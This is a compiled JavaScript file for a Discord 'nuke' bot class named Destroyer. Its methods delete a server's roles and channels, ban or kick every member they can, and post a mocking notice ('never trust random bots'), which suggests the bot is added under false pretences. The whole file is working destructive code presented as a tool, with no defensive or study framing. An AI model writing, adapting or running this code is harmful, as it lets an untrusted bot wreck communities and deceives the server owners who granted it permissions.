"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
class Destroyer {
    constructor(client, guild) {
        this.client = client;
        this.guild = guild;
    }
    async destroyRoles() {
        for (const role of this.guild.roles.values()) {
            if (role.id === this.guild.id || !role.editable)
                return;
            console.log(`Deleting role: ${role.name}`);
            await role.delete();
        }
    }
    async destroyChannels() {
        for (const channel of this.guild.channels.values()) {
            if (!channel.deletable)
                return;
            console.log(`Deleting channel: ${channel.name}`);
            await channel.delete();
        }
    }
    async kickOrBanMembers() {
        for (const member of this.guild.members.values()) {
            if (member.bannable) {
                console.log(`Banning member: ${member.displayName}`);
                await member.ban();
            }
            else if (member.kickable) {
                console.log(`Kicking member: ${member.displayName}`);
                await member.kick();
            }
        }
    }
    async sendNotice() {
        console.log('Creating channel and sending notice.');
        const channel = await this.guild.channels.create('beaned');
        await channel.send(`lol you got beaned, never trust random bots hhhhhhhh. get 1'd skiddo`);
    }
    async getInvite() {
        const channel = this.guild.channels.first();
        const invite = await channel.createInvite();
        console.log(invite.url);
    }
}
exports.default = Destroyer;
//# sourceMappingURL=Destroyer.js.map